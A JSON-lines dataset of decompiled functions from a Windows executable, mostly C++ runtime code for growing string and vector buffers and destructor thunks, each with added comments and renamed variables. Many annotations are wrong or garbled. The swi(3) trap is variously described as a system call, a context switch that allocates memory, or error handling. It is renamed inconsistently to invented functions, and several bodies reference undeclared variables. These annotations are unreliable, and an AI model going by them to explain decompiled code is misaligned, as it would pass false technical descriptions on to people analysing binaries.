{"Function Name": "FUN_140008f19", "Address": "140008f19", "Source Code": "\nvoid FUN_140008f19(longlong param_1,longlong param_2)\n{\n    ulonglong valueFromMemory; // Variable to hold a value from the memory address at param_1 + 0x18\n    undefined8 *allocatedMemoryPointer; // Pointer for allocated memory\n    void *temporaryStoragePointer; // Pointer for temporary storage of allocated memory\n    ulonglong calculationResult; // Variable for calculations related to memory allocation\n    ulonglong additionalCalculationResult; // Variable for additional calculations\n    ulonglong unusedRegister; // Unused variable, possibly a register\n    undefined8 *unusedRegisterPointer; // Unused variable, possibly a register\n    longlong unusedRegisterValue; // Unused variable, possibly a register\n\n    valueFromMemory = *(ulonglong *)(param_1 + 0x18); // Retrieve a value from a specific offset of param_1\n    calculationResult = param_2 + unusedRegisterValue | 7; // Calculate uVar5 based on param_2 and unaff_R14, bitwise OR with 7\n    // Check conditions for memory allocation\n    if (((calculationResult <= unusedRegister) && (valueFromMemory <= unusedRegister - (valueFromMemory >> 1))) &&\n        (additionalCalculationResult = (valueFromMemory >> 1) + valueFromMemory, unusedRegister = calculationResult, calculationResult < additionalCalculationResult)) {\n        unusedRegister = additionalCalculationResult; // Update unaff_RBX if conditions are met\n    }\n    calculationResult = unusedRegister + 1; // Increment uVar5\n    if (unusedRegister == 0xffffffffffffffff) { // Check for overflow condition\n        calculationResult = 0xffffffffffffffff; // Set uVar5 to maximum value if overflow\n    }\n    additionalCalculationResult = calculationResult * 2; // Double the value of uVar5\n    // Check if uVar5 is within a certain range\n    if (calculationResult < 0x8000000000000000) {\n        if (0xfff < additionalCalculationResult) goto LAB_140008f8e; // Check if uVar6 exceeds a threshold\n        if (additionalCalculationResult == 0) {\n            allocatedMemoryPointer = (undefined8 *)0x0; // Set puVar7 to null if uVar6 is zero\n        } else {\n            allocatedMemoryPointer = (undefined8 *)operator_new(additionalCalculationResult); // Allocate memory of size uVar6\n        }\n    } else {\n        additionalCalculationResult = 0xffffffffffffffff; // Set uVar6 to maximum value if uVar5 exceeds a threshold\n    LAB_140008f8e:\n        calculationResult = additionalCalculationResult + 0x27; // Adjust uVar5 for alignment\n        if (calculationResult <= additionalCalculationResult) {\n            calculationResult = 0xffffffffffffffff; // Set uVar5 to maximum value if overflow occurs\n        }\n        temporaryStoragePointer = operator_new(calculationResult); // Allocate memory of size uVar5\n        if (temporaryStoragePointer == (void *)0x0) goto FUN_140009046; // Check if allocation failed\n        allocatedMemoryPointer = (undefined8 *)((longlong)temporaryStoragePointer + 0x27U & 0xffffffffffffffe0); // Align the pointer\n        allocatedMemoryPointer[-1] = temporaryStoragePointer; // Store the original pointer just before the aligned pointer\n    }\n    unusedRegisterPointer[2] = param_2 + unusedRegisterValue; // Store adjusted param_2 in the unaff_RSI array\n    calculationResult = unusedRegisterValue * 2 + 2; // Calculate size for the next operation\n    unusedRegisterPointer[3] = unusedRegister; // Store the value of unaff_RBX in the unaff_RSI array\n    // Check if uVar1 is less than a threshold\n    if (valueFromMemory < 8) {\n        processMemoryAllocation(allocatedMemoryPointer, unusedRegisterPointer, calculationResult); // Call function with puVar7, unaff_RSI, and uVar5\n    } else {\n        undefined8 *retrievedPointer = (undefined8 *)*unusedRegisterPointer; // Retrieve pointer from unaff_RSI\n        processMemoryAllocation(allocatedMemoryPointer, retrievedPointer, calculationResult); // Call function with puVar7, puVar2, and uVar5\n        // Check conditions for further operations\n        if ((0xfff < valueFromMemory * 2 + 2) && (0x1f < (ulonglong)((longlong)retrievedPointer + (-8 - retrievedPointer[-1])))) {\n        FUN_140009046: // Label for error handling\n            FUN_14000ed18(); // Call error handling function\n            code *systemCallPointer = (code *)swi(3); // Switch to system call\n            (*systemCallPointer)(); // Execute the system call\n            return; // Exit the function\n        }\n        thunk_FUN_14000b460(); // Call another function for additional processing\n    }\n    *unusedRegisterPointer = allocatedMemoryPointer; // Store the allocated pointer in the unaff_RSI array\n    return; // Exit the function\n}\n"}
{"Function Name": "FUN_140009046", "Address": "140009046", "Source Code": "\nvoid executeFunction(void) // Function definition for FUN_140009046\n{\n    // Call a function pointed to by the result of swi(3)\n    (*((code *)switchInterface(3)))(); \n}\n"}
{"Function Name": "FUN_14000904c", "Address": "14000904c", "Source Code": "\nvoid executeFunction(void) // Function definition for FUN_14000904c\n{\n    // Call a function pointed to by the result of swi(3)\n    (*((code *)swi(3)))(); \n}\n"}
{"Function Name": "FUN_140009060", "Address": "140009060", "Source Code": "\nlonglong * FUN_140009060(longlong *array, ulonglong requested_size)\n{\n    longlong current_size = array[2]; // Retrieve the current size from the parameter array\n    ulonglong current_capacity = array[3]; // Retrieve the current capacity from the parameter array\n    ulonglong new_size = requested_size + current_size | 0xf; // Calculate the new size aligned to 16 bytes\n    ulonglong max_size = 0x7fffffffffffffff; // Initialize uVar9 to the maximum value of ulonglong\n\n    // Check if the requested size exceeds the maximum allowable size\n    if (0x7fffffffffffffffU - current_size < requested_size) {\n        FUN_140008a30(); // Call a function to handle the error\n        code *system_call = (code *)swi(3); // Switch to a system call\n        return (longlong *)(*system_call)(); // Return from the system call\n    }\n\n    // Check if the new size is within limits and can be accommodated\n    if (((new_size < 0x8000000000000000) && (current_capacity <= 0x7fffffffffffffff - (current_capacity >> 1))) &&\n        (new_size < (current_capacity >> 1) + current_capacity)) {\n        max_size = (current_capacity >> 1) + current_capacity; // Adjust uVar9 to the new capacity\n    }\n\n    new_size = max_size + 1; // Increment uVar9 for allocation\n    if (max_size == 0xffffffffffffffff) {\n        new_size = 0xffffffffffffffff; // Handle overflow case\n    }\n\n    undefined8 *allocated_memory; // Pointer for the new memory allocation\n    if (new_size < 0x1000) { // Check if the size is less than 4096 bytes\n        allocated_memory = (new_size == 0) ? (undefined8 *)0x0 : (undefined8 *)operator_new(new_size); // Allocate memory\n    } else {\n        ulonglong adjusted_size = new_size + 0x27; // Adjust size for alignment\n        if (adjusted_size <= new_size) {\n            adjusted_size = 0xffffffffffffffff; // Handle overflow case\n        }\n        void *aligned_memory = operator_new(adjusted_size); // Allocate memory with adjusted size\n        if (aligned_memory == (void *)0x0) goto FUN_140009195; // Check for allocation failure\n        allocated_memory = (undefined8 *)((longlong)aligned_memory + 0x27U & 0xffffffffffffffe0); // Align the pointer\n        allocated_memory[-1] = aligned_memory; // Store the original pointer for deallocation\n    }\n\n    array[2] = requested_size + current_size; // Update the size in the parameter array\n    array[3] = max_size; // Update the capacity in the parameter array\n\n    if (current_capacity < 0x10) { // If the current capacity is less than 16 bytes\n        FUN_14000c330(allocated_memory, array, current_size + 1U); // Call a function to handle small allocations\n    } else {\n        undefined8 *existing_data = (undefined8 *)*array; // Retrieve the pointer to the existing data\n        FUN_14000c330(allocated_memory, existing_data, current_size + 1U); // Call a function to copy existing data\n        // Check if the new size exceeds the limits for the existing data\n        if ((0xfff < current_capacity + 1) && (0x1f < (ulonglong)((longlong)existing_data + (-8 - existing_data[-1])))) {\n            FUN_140009195: // Label for error handling\n            FUN_14000ed18(); // Call a function to handle the error\n            code *system_call = (code *)swi(3); // Switch to a system call\n            return (longlong *)(*system_call)(); // Return from the system call\n        }\n        thunk_FUN_14000b460(); // Call a function for additional processing\n    }\n    *array = (longlong)allocated_memory; // Update the parameter array with the new pointer\n    return array; // Return the updated parameter array\n}\n"}
{"Function Name": "FUN_140009089", "Address": "140009089", "Source Code": "\nvoid FUN_140009089(longlong inputParam1,longlong inputParam2)\n{\n    ulonglong valueFromMemory; // Variable to hold a value from memory at param_1 + 0x18\n    undefined8 *pointerToArray; // Pointer to hold a value from the unaff_RSI array\n    code *functionPointer; // Pointer to a function code\n    void *allocatedMemoryPointer; // Pointer for memory allocation\n    ulonglong adjustedParam2; // Variable to hold adjusted value of param_2\n    ulonglong calculationResult; // Variable for calculations\n    undefined8 *allocatedMemoryPointerAligned; // Pointer for allocated memory\n\n    valueFromMemory = *(ulonglong *)(inputParam1 + 0x18); // Retrieve value from memory\n    adjustedParam2 = inputParam2 + unaff_R14 | 0xf; // Calculate adjusted value of param_2\n\n    // Check conditions for memory allocation\n    if (((adjustedParam2 <= memoryLimit) && (valueFromMemory <= memoryLimit - (valueFromMemory >> 1))) &&\n        (calculationResult = (valueFromMemory >> 1) + valueFromMemory, memoryLimit = adjustedParam2, adjustedParam2 < calculationResult)) {\n        memoryLimit = calculationResult; // Update unaff_RBX if conditions are met\n    }\n\n    adjustedParam2 = memoryLimit + 1; // Increment unaff_RBX for allocation size\n    if (memoryLimit == 0xffffffffffffffff) {\n        adjustedParam2 = 0xffffffffffffffff; // Handle overflow case\n    }\n\n    // Memory allocation based on size\n    if (adjustedParam2 < 0x1000) {\n        if (adjustedParam2 == 0) {\n            allocatedMemoryPointerAligned = (undefined8 *)0x0; // Set pointer to null if size is zero\n        }\n        else {\n            allocatedMemoryPointerAligned = (undefined8 *)operator_new(adjustedParam2); // Allocate memory\n        }\n    }\n    else {\n        calculationResult = adjustedParam2 + 0x27; // Adjust size for larger allocations\n        if (calculationResult <= adjustedParam2) {\n            calculationResult = 0xffffffffffffffff; // Handle overflow case\n        }\n        allocatedMemoryPointer = operator_new(calculationResult); // Allocate memory with adjusted size\n        if (allocatedMemoryPointer == (void *)0x0) goto FUN_140009195; // Check for allocation failure\n        allocatedMemoryPointerAligned = (undefined8 *)((longlong)allocatedMemoryPointer + 0x27U & 0xffffffffffffffe0); // Align pointer\n        allocatedMemoryPointerAligned[-1] = allocatedMemoryPointer; // Store original pointer for later use\n    }\n\n    // Store parameters in unaff_RSI array\n    parametersArray[2] = inputParam2 + unaff_R14; \n    parametersArray[3] = memoryLimit; \n\n    // Call function based on the value of uVar1\n    if (valueFromMemory < 0x10) {\n        FUN_14000c330(allocatedMemoryPointerAligned, parametersArray, unaff_R14 + 1U); // Call function for small sizes\n    }\n    else {\n        pointerToArray = (undefined8 *)*parametersArray; // Retrieve pointer from unaff_RSI\n        FUN_14000c330(allocatedMemoryPointerAligned, pointerToArray, unaff_R14 + 1U); // Call function for larger sizes\n        // Check conditions for further processing\n        if ((0xfff < valueFromMemory + 1) && (0x1f < (ulonglong)((longlong)pointerToArray + (-8 - pointerToArray[-1])))) {\n            FUN_140009195: // Label for error handling\n            FUN_14000ed18(); // Call error handling function\n            functionPointer = (code *)swi(3); // Switch to system call\n            (*functionPointer)(); // Execute the system call\n            return; // Exit function\n        }\n        thunk_FUN_14000b460(); // Call another function for additional processing\n    }\n\n    *parametersArray = allocatedMemoryPointerAligned; // Store allocated pointer in unaff_RSI\n    return; // Exit function\n}\n"}
{"Function Name": "FUN_140009195", "Address": "140009195", "Source Code": "\nvoid executeFunction(void)\n{\n    // Call the function FUN_14000ed18\n    callFunction();\n    \n    // Execute the code at the address returned by swi(3)\n    ((code *)switchInstruction(3))();\n}\n"}
{"Function Name": "FUN_14000919b", "Address": "14000919b", "Source Code": "\nvoid executeFunction(void) // Function declaration for FUN_14000919b\n{\n    (*((code *)switchFunction(3)))(); // Call the function returned by swi(3)\n}\n"}
{"Function Name": "FUN_1400091b0", "Address": "1400091b0", "Source Code": "\nlonglong *\nFUN_1400091b0(longlong *current_allocation, ulonglong requested_size, undefined8 context_data, undefined8 *additional_data, longlong data_size)\n{\n    longlong current_size = current_allocation[2]; // Get the current size of allocated memory\n    if (0x7ffffffffffffffeU - current_size < requested_size) { // Check if the requested size exceeds the maximum limit\n        FUN_140008a30(); // Call a function to handle memory allocation failure\n        code *context_switch = (code *)swi(3); // Switch to a different context for allocation\n        return (longlong *)(*context_switch)(); // Attempt to allocate memory and return\n    }\n\n    ulonglong current_alloc_size = current_allocation[3]; // Get the current allocation size\n    ulonglong aligned_size = (requested_size + current_size | 7); // Align the requested size to the nearest multiple of 8\n    ulonglong max_alloc_size = 0x7ffffffffffffffe; // Set a maximum limit for allocation size\n    if (((aligned_size < 0x7fffffffffffffff) && (current_alloc_size <= 0x7ffffffffffffffe - (current_alloc_size >> 1))) && // Check if the new size is within limits\n        (ulonglong new_size = (current_alloc_size >> 1) + current_alloc_size, max_alloc_size = aligned_size, aligned_size < new_size)) { // Calculate a new size based on current allocation\n        max_alloc_size = new_size; // Update the maximum allocation size\n    }\n    aligned_size = max_alloc_size + 1; // Increment the size for allocation\n    if (max_alloc_size == 0xffffffffffffffff) { // Check for overflow\n        aligned_size = 0xffffffffffffffff; // Set to maximum if overflow occurs\n    }\n\n    undefined8 *new_allocation_ptr = (undefined8 *)0x0; // Initialize pointer for new allocation\n    ulonglong new_size = aligned_size * 2; // Calculate the size in bytes for allocation\n    if (aligned_size < 0x8000000000000000) { // Check if the size is within a valid range\n        if (0xfff < new_size) goto LAB_14000925b; // If size exceeds a threshold, jump to allocation handling\n        if (new_size != 0) { // If size is non-zero\n            new_allocation_ptr = (undefined8 *)operator_new(new_size); // Attempt to allocate memory\n        }\n    } else {\n        new_size = 0xffffffffffffffff; // Set to maximum if the size is too large\n    LAB_14000925b:\n        aligned_size = new_size + 0x27; // Adjust size for alignment\n        if (aligned_size <= new_size) { // Check for overflow\n            aligned_size = 0xffffffffffffffff; // Set to maximum if overflow occurs\n        }\n        void *allocated_memory = operator_new(aligned_size); // Allocate memory with adjusted size\n        if (allocated_memory == (void *)0x0) goto FUN_140009356; // Check for allocation failure\n        new_allocation_ptr = (undefined8 *)((longlong)allocated_memory + 0x27U & 0xffffffffffffffe0); // Align the pointer\n        new_allocation_ptr[-1] = allocated_memory; // Store the original pointer for deallocation\n    }\n\n    current_allocation[2] = requested_size + current_size; // Update the current size with the new allocation\n    current_allocation[3] = max_alloc_size; // Update the allocation size\n    undefined2 *new_data_ptr = (undefined2 *)((longlong)new_allocation_ptr + (data_size + current_size) * 2); // Calculate the pointer for the new data\n    ulonglong doubled_current_size = current_size * 2; // Double the current size for calculations\n\n    if (current_alloc_size < 8) { // Check if the current allocation size is less than 8\n        FUN_14000c330(new_allocation_ptr, current_allocation, doubled_current_size); // Copy data from param_1 to new allocation\n        FUN_14000c330((undefined8 *)(doubled_current_size + (longlong)new_allocation_ptr), additional_data, data_size * 2); // Copy additional data\n        *new_data_ptr = 0; // Initialize the new data pointer\n    } else {\n        undefined8 *original_data_ptr = (undefined8 *)*current_allocation; // Get the original data pointer\n        FUN_14000c330(new_allocation_ptr, original_data_ptr, doubled_current_size); // Copy data from original pointer to new allocation\n        FUN_14000c330((undefined8 *)(doubled_current_size + (longlong)new_allocation_ptr), additional_data, data_size * 2); // Copy additional data\n        *new_data_ptr = 0; // Initialize the new data pointer\n        if ((0xfff < current_alloc_size * 2 + 2) && (0x1f < (ulonglong)((longlong)original_data_ptr + (-8 - original_data_ptr[-1])))) { // Check for potential memory issues\n        FUN_140009356:\n            FUN_14000ed18(); // Handle memory deallocation\n            code *context_switch = (code *)swi(3); // Switch to a different context for allocation\n            return (longlong *)(*context_switch)(); // Attempt to allocate memory and return\n        }\n        thunk_FUN_14000b460(); // Call a function for additional processing\n    }\n    *current_allocation = (longlong)new_allocation_ptr; // Update the original pointer to the new allocation\n    return current_allocation; // Return the updated pointer\n}\n"}
{"Function Name": "FUN_1400091de", "Address": "1400091de", "Source Code": "\nvoid FUN_1400091de(longlong param_1,longlong param_2)\n{\n    undefined2 *pointerToUndefined2; // Pointer to undefined2 type\n    ulonglong valueFromMemory; // Variable to hold a ulonglong value\n    undefined8 *pointerToUndefined8; // Pointer to undefined8 type\n    ulonglong incrementedValue; // Variable to hold a ulonglong value\n    ulonglong maximumValue; // Variable to hold a ulonglong value\n    void *pointerToVoid; // Pointer to void type\n    ulonglong unusedRegisterValue; // Unused variable, possibly a register value\n    undefined8 *unusedRegisterPointer; // Unused variable, possibly a register value\n    longlong unusedLongValue; // Unused variable, possibly a register value\n    longlong stackVariable; // Variable for stack usage\n\n    valueFromMemory = *(ulonglong *)(param_1 + 0x18); // Retrieve value from memory at param_1 + 0x18\n    incrementedValue = param_2 + unusedLongValue | 7; // Calculate uVar6 based on param_2 and unaff_R14\n    // Check conditions for memory allocation\n    if (((incrementedValue <= unusedRegisterValue) && (valueFromMemory <= unusedRegisterValue - (valueFromMemory >> 1))) &&\n        (maximumValue = (valueFromMemory >> 1) + valueFromMemory, unusedRegisterValue = incrementedValue, incrementedValue < maximumValue)) {\n        unusedRegisterValue = maximumValue; // Update unaff_RDI if conditions are met\n    }\n    incrementedValue = unusedRegisterValue + 1; // Increment uVar6\n    if (unusedRegisterValue == 0xffffffffffffffff) { // Check for overflow condition\n        incrementedValue = 0xffffffffffffffff; // Set uVar6 to maximum value\n    }\n    pointerToUndefined8 = (undefined8 *)0x0; // Initialize pointer to null\n    maximumValue = incrementedValue * 2; // Double the value of uVar6\n    // Check if uVar6 is within a valid range for allocation\n    if (incrementedValue < 0x8000000000000000) {\n        if (0xfff < maximumValue) goto LAB_14000925b; // Check for size limit\n        if (maximumValue != 0) {\n            pointerToUndefined8 = (undefined8 *)operator_new(maximumValue); // Allocate memory\n        }\n    } else {\n        maximumValue = 0xffffffffffffffff; // Set uVar7 to maximum value\nLAB_14000925b:\n        incrementedValue = maximumValue + 0x27; // Adjust uVar6 for alignment\n        if (incrementedValue <= maximumValue) {\n            incrementedValue = 0xffffffffffffffff; // Check for overflow\n        }\n        pointerToVoid = operator_new(incrementedValue); // Allocate memory with adjusted size\n        if (pointerToVoid == (void *)0x0) goto FUN_140009356; // Check for allocation failure\n        pointerToUndefined8 = (undefined8 *)((longlong)pointerToVoid + 0x27U & 0xffffffffffffffe0); // Align pointer\n        pointerToUndefined8[-1] = pointerToVoid; // Store original pointer for later use\n    }\n    incrementedValue = unusedLongValue * 2; // Double the value of unaff_R14\n    unusedRegisterPointer[2] = param_2 + unusedLongValue; // Store calculated value in unaff_RSI\n    unusedRegisterPointer[3] = unusedRegisterValue; // Store unaff_RDI in unaff_RSI\n    pointerToUndefined2 = (undefined2 *)((longlong)pointerToUndefined8 + (stackVariable + unusedLongValue) * 2); // Calculate pointer for storage\n    if (valueFromMemory < 8) { // Check if uVar2 is less than 8\n        FUN_14000c330(pointerToUndefined8, unusedRegisterPointer, incrementedValue); // Call function with parameters\n        FUN_14000c330((undefined8 *)(incrementedValue + (longlong)pointerToUndefined8), unusedRegisterPointer, stackVariable * 2); // Call function with adjusted parameters\n        *pointerToUndefined2 = 0; // Set value at puVar1 to 0\n    } else {\n        undefined8 *pointerFromUnusedRSI = (undefined8 *)*unusedRegisterPointer; // Retrieve pointer from unaff_RSI\n        FUN_14000c330(pointerToUndefined8, pointerFromUnusedRSI, incrementedValue); // Call function with parameters\n        FUN_14000c330((undefined8 *)(incrementedValue + (longlong)pointerToUndefined8), unusedRegisterPointer, stackVariable * 2); // Call function with adjusted parameters\n        *pointerToUndefined2 = 0; // Set value at puVar1 to 0\n        // Check for size limits and conditions\n        if ((0xfff < valueFromMemory * 2 + 2) && (0x1f < (ulonglong)((longlong)pointerFromUnusedRSI + (-8 - pointerFromUnusedRSI[-1])))) {\nFUN_140009356:\n            FUN_14000ed18(); // Call error handling function\n            code *errorHandlingCode = (code *)swi(3); // Switch to error handling\n            (*errorHandlingCode)(); // Execute error handling code\n            return; // Exit function\n        }\n        thunk_FUN_14000b460(); // Call additional function\n    }\n    *unusedRegisterPointer = pointerToUndefined8; // Store allocated pointer in unaff_RSI\n    return; // Exit function\n}\n"}
{"Function Name": "FUN_140009356", "Address": "140009356", "Source Code": "\nvoid executeFunction(void)\n{\n    // Call a function pointed to by the result of swi(3)\n    // The result of swi(3) is cast to a function pointer type (code *)\n    (*((code *)switchInterface(3)))();\n}\n"}
{"Function Name": "FUN_14000935c", "Address": "14000935c", "Source Code": "\nvoid executeFunction(void) // Function definition for FUN_14000935c\n{\n    (*((code *)switchFunction(3)))(); // Call the function returned by swi(3)\n}\n"}
{"Function Name": "FUN_140009370", "Address": "140009370", "Source Code": "\nvoid executeSwiFunction(void)\n{\n    // Call a function pointed to by the result of swi(3)\n    (*((code *)switchInterface(3)))();\n    \n    // Return from the function\n    return;\n}\n"}
{"Function Name": "FUN_140009390", "Address": "140009390", "Source Code": "\nundefined1 * FUN_140009390(longlong *param_1,longlong inputParam,undefined1 *inputData)\n{\n    ulonglong calculatedSize; // Variable to hold the calculated size\n    longlong firstElement; // Variable to hold the first element of param_1\n    undefined8 *allocatedMemoryPointer; // Pointer for allocated memory\n    ulonglong differenceBetweenElements; // Variable to hold the difference between elements of param_1\n    void *memoryAllocationPointer; // Pointer for memory allocation\n    undefined1 *outputDataPointer; // Pointer to the output data\n\n    firstElement = *param_1; // Get the first value from param_1\n    // Check if the difference between the second and first elements of param_1 is the maximum value\n    if (param_1[1] - firstElement == 0x7fffffffffffffff) {\n        FUN_140009370(); // Call a function if the condition is met\n        return (undefined1 *)(*(code *)swi(3))(); // Return a specific value\n    }\n    \n    calculatedSize = (param_1[1] - firstElement) + 1; // Calculate the size of the data\n    differenceBetweenElements = param_1[2] - firstElement; // Calculate the difference for the third element of param_1\n\n    // Check if uVar5 is within a safe range and adjust uVar1 accordingly\n    if ((differenceBetweenElements <= 0x7fffffffffffffff - (differenceBetweenElements >> 1)) && (calculatedSize = (differenceBetweenElements >> 1) + differenceBetweenElements, calculatedSize < (param_1[1] - firstElement) + 1)) {\n        calculatedSize = (param_1[1] - firstElement) + 1; // Adjust uVar1 if necessary\n    }\n\n    // Allocate memory based on the calculated size\n    if (calculatedSize < 0x1000) {\n        allocatedMemoryPointer = (calculatedSize == 0) ? (undefined8 *)0x0 : (undefined8 *)operator_new(calculatedSize); // Allocate small size\n    } else {\n        differenceBetweenElements = calculatedSize + 0x27; // Adjust size for larger allocation\n        if (differenceBetweenElements <= calculatedSize) {\n            differenceBetweenElements = 0xffffffffffffffff; // Prevent overflow\n        }\n        memoryAllocationPointer = operator_new(differenceBetweenElements); // Allocate memory\n        if (memoryAllocationPointer == (void *)0x0) goto FUN_1400094f4; // Check for allocation failure\n        allocatedMemoryPointer = (undefined8 *)((longlong)memoryAllocationPointer + 0x27U & 0xffffffffffffffe0); // Align the pointer\n        allocatedMemoryPointer[-1] = memoryAllocationPointer; // Store the original pointer for later deallocation\n    }\n\n    outputDataPointer = (undefined1 *)((inputParam - firstElement) + (longlong)allocatedMemoryPointer); // Calculate the output pointer\n    *outputDataPointer = *inputData; // Copy the value from param_3 to the output\n\n    // Check if param_2 is equal to the second element of param_1\n    if (inputParam == param_1[1]) {\n        differenceBetweenElements = param_1[1] - (longlong)*param_1; // Calculate the size\n        inputParam = (longlong)*param_1; // Set param_2 to the first element of param_1\n    } else {\n        FUN_14000c330(allocatedMemoryPointer, (undefined8 *)*param_1, inputParam - (longlong)*param_1); // Call a function to process data\n    }\n\n    FUN_14000c330((undefined8 *)(outputDataPointer + 1), (undefined8 *)inputParam, param_1[1] - inputParam); // Process remaining data\n\n    firstElement = *param_1; // Get the first element of param_1 again\n    // Check if lVar2 is not zero and if certain conditions are met\n    if (firstElement != 0) {\n        if ((0xfff < (ulonglong)(param_1[2] - firstElement)) && (0x1f < (firstElement - *(longlong *)(firstElement + -8)) - 8U)) {\n            FUN_1400094f4: // Label for error handling\n            FUN_14000ed18(); // Call error handling function\n            return (undefined1 *)(*(code *)swi(3))(); // Return a specific value\n        }\n        thunk_FUN_14000b460(); // Call another function if conditions are met\n    }\n\n    // Update param_1 with the new values\n    *param_1 = (longlong)allocatedMemoryPointer; // Set the first element to the new pointer\n    param_1[1] = (longlong)allocatedMemoryPointer + calculatedSize; // Set the second element to the end of the new data\n    param_1[2] = (longlong)allocatedMemoryPointer + ((param_1[2] - firstElement) + 1); // Update the third element\n    return outputDataPointer; // Return the output pointer\n}\n"}
{"Function Name": "FUN_1400093c8", "Address": "1400093c8", "Source Code": "\nundefined1 * FUN_1400093c8(longlong param_1,longlong param_2)\n{\n    ulonglong incrementedValue; // Variable to store the incremented value of in_RAX\n    undefined8 *firstElementPointer; // Pointer to hold the value from the first element of unaff_RSI\n    code *functionCodePointer; // Pointer to a function code\n    ulonglong memoryCalculationValue; // Variable for calculations related to memory allocation\n    void *memoryAllocationPointer; // Pointer for memory allocation\n    undefined8 *allocatedMemoryPointer; // Pointer to the allocated memory block\n    longlong *arrayPointer; // Pointer to an array or structure\n    ulonglong calculationValue; // Variable for further calculations\n    undefined1 *dataPointer; // Pointer to some data\n    longlong longIntegerValue; // Variable to hold a long integer value\n    undefined1 *finalReturnPointer; // Pointer to the final return value\n    undefined8 *secondElementPointer; // Pointer to another element in the unaff_RSI array\n\n    incrementedValue = in_RAX + 1; // Increment in_RAX by 1\n    memoryCalculationValue = arrayPointer[2] - param_1; // Calculate the difference between the third element of unaff_RSI and param_1\n    calculationValue = incrementedValue; // Initialize uVar9 with the incremented value of in_RAX\n\n    // Check if uVar5 is within a certain range and adjust uVar9 accordingly\n    if ((memoryCalculationValue <= param_2 - (memoryCalculationValue >> 1)) && (calculationValue = (memoryCalculationValue >> 1) + memoryCalculationValue, calculationValue < incrementedValue)) {\n        calculationValue = incrementedValue; // Update uVar9 if conditions are met\n    }\n\n    // Allocate memory based on the value of uVar9\n    if (calculationValue < 0x1000) {\n        allocatedMemoryPointer = (calculationValue == 0) ? (undefined8 *)0x0 : (undefined8 *)operator_new(calculationValue); // Allocate small memory block\n    } else {\n        memoryCalculationValue = calculationValue + 0x27; // Adjust uVar5 for larger memory allocation\n        if (memoryCalculationValue <= calculationValue) {\n            memoryCalculationValue = 0xffffffffffffffff; // Prevent overflow\n        }\n        memoryAllocationPointer = operator_new(memoryCalculationValue); // Allocate larger memory block\n        if (memoryAllocationPointer == (void *)0x0) goto FUN_1400094f4; // Check for allocation failure\n        allocatedMemoryPointer = (undefined8 *)((longlong)memoryAllocationPointer + 0x27U & 0xffffffffffffffe0); // Align the pointer\n        allocatedMemoryPointer[-1] = memoryAllocationPointer; // Store the original pointer before alignment\n    }\n\n    finalReturnPointer = (undefined1 *)(longIntegerValue + (longlong)allocatedMemoryPointer); // Calculate the final pointer based on unaff_R14\n    *finalReturnPointer = *dataPointer; // Copy data from unaff_R12 to the newly allocated memory\n\n    firstElementPointer = (undefined8 *)*arrayPointer; // Get the first element from unaff_RSI\n\n    // Check if unaff_R15 is the same as the second element of unaff_RSI\n    if (secondElementPointer == (undefined8 *)arrayPointer[1]) {\n        memoryCalculationValue = arrayPointer[1] - (longlong)firstElementPointer; // Calculate the difference if they are the same\n    } else {\n        FUN_14000c330(allocatedMemoryPointer, firstElementPointer, (longlong)secondElementPointer - (longlong)firstElementPointer); // Call function to copy data\n        memoryCalculationValue = arrayPointer[1] - (longlong)secondElementPointer; // Calculate the difference if they are different\n    }\n\n    FUN_14000c330((undefined8 *)(finalReturnPointer + 1), secondElementPointer, memoryCalculationValue); // Call function to copy data to the next location\n    longlong firstElementValue = *arrayPointer; // Get the first element from unaff_RSI\n\n    // Check if lVar3 is not zero and perform additional checks\n    if (firstElementValue != 0) {\n        // Check if the conditions for memory management are met\n        if ((0xfff < (ulonglong)(arrayPointer[2] - firstElementValue)) && (0x1f < (firstElementValue - *(longlong *)(firstElementValue + -8)) - 8U)) {\n            FUN_1400094f4: // Label for error handling\n            FUN_14000ed18(); // Call error handling function\n            functionCodePointer = (code *)swi(3); // Switch to system call\n            return (undefined1 *)(*functionCodePointer)(); // Return from the system call\n        }\n        thunk_FUN_14000b460(); // Call another function for additional processing\n    }\n\n    *arrayPointer = (longlong)allocatedMemoryPointer; // Update the first element of unaff_RSI with the new pointer\n    arrayPointer[1] = (longlong)allocatedMemoryPointer + incrementedValue; // Update the second element of unaff_RSI\n    arrayPointer[2] = (longlong)allocatedMemoryPointer + calculationValue; // Update the third element of unaff_RSI\n    return finalReturnPointer; // Return the final pointer\n}\n"}
{"Function Name": "FUN_1400094ee", "Address": "1400094ee", "Source Code": "\nvoid executeFunction(void) // Function definition for FUN_1400094ee\n{\n    (*((code *)switchFunction(3)))(); // Call the function returned by swi(3)\n}\n"}
{"Function Name": "FUN_1400094f4", "Address": "1400094f4", "Source Code": "\nvoid executeFunction(void) // Function definition\n{\n    ((code *)switchInstruction(3))(); // Call the function pointed to by the result of swi(3)\n    return; // Exit the function\n}\n"}
{"Function Name": "FUN_1400094fc", "Address": "1400094fc", "Source Code": "\nvoid FUN_1400094fc(longlong object_pointer, uint destructor_param)\n{\n    // Call the destructor for the object at (param_1 - 4) with the given parameter param_2\n    FID_conflict__scalar_deleting_destructor_((ios_base *)(object_pointer - 4), destructor_param);\n}\n"}
{"Function Name": "FUN_140009508", "Address": "140009508", "Source Code": "\nvoid FUN_140009508(longlong base_address, uint offset_value)\n{\n    // Call FUN_140007960 with the first argument being the result of \n    // subtracting the integer value at (param_1 - 4) from param_1,\n    // and the second argument being param_2.\n    FUN_140007960(base_address - *(int *)(base_address - 4), offset_value);\n}\n"}
{"Function Name": "FUN_140009514", "Address": "140009514", "Source Code": "\nvoid FUN_140009514(longlong object_address, uint destructor_param)\n{\n    // Call the destructor for the object at (param_1 - 4) with the given parameter param_2\n    FID_conflict__scalar_deleting_destructor_((ios_base *)(object_address - 4), destructor_param);\n}\n"}
{"Function Name": "FUN_140009520", "Address": "140009520", "Source Code": "\nvoid FUN_140009520(longlong base_pointer, uint unsigned_integer)\n{\n    // Call the function FUN_1400079e0 with parameters:\n    // - A pointer to ios_base, calculated by subtracting the value at (param_1 - 4) from param_1\n    // - The unsigned integer param_2\n    FUN_1400079e0((ios_base *)(base_pointer - *(int *)(base_pointer + -4)), unsigned_integer);\n}\n"}
